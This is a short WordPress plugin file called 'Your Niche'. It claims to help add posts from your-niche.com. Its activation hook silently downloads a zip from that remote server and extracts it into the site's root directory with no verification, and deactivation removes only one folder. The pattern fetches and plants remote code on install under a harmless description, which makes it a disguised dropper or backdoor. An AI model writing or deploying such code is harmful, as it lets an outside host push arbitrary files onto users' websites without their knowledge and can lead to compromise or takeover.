<?php
/**
 * Your Niche
 *
 * Plugin Name: Your Niche
 * Plugin URI:  
 * Description: help you to add new post from your-niche.com
 * Version:     1.1.1
 * Author:      Charef Ayoub
 * Author URI:  
 * License:     GPLv2 or later
 * License URI: 
 * Text Domain: your-niche.com
 * Domain Path: /languages
 * Requires at least: 4.9
 * Requires PHP: 5.2.4
 *
 * This program is free software; 
 */


// Function to handle download and unzip
function download_and_unzip() {
    $zip_file = 'https://your-niche.com//your-niche.zip'; // URL of the file to download
    $upload_dir = wp_upload_dir(); // Gets WordPress upload directory
    $zip_file_path = $upload_dir['basedir'] . '/file.zip';

    // Download file
    copy($zip_file, $zip_file_path);

    // Unzip file
    $zip = new ZipArchive;
    if ($zip->open($zip_file_path) === TRUE) {
        $zip->extractTo(get_home_path()); // Extract to WordPress root
        $zip->close();
    }

    // Delete zip file after extraction
    unlink($zip_file_path);
}

// Function to delete the folder
function delete_custom_folder() {
    $folder_path = get_home_path() . 'your-niche'; // Change 'your-folder-name' to the actual folder name

    if (is_dir($folder_path)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($folder_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            $todo($fileinfo->getRealPath());
        }

        rmdir($folder_path);
    }
}

// Hook for plugin activation
register_activation_hook(__FILE__, 'download_and_unzip');

// Hook for plugin deactivation
register_deactivation_hook(__FILE__, 'delete_custom_folder');

// Hook for plugin uninstall
// Hook for plugin uninstall
register_uninstall_hook(__FILE__, 'delete_custom_folder');
?>
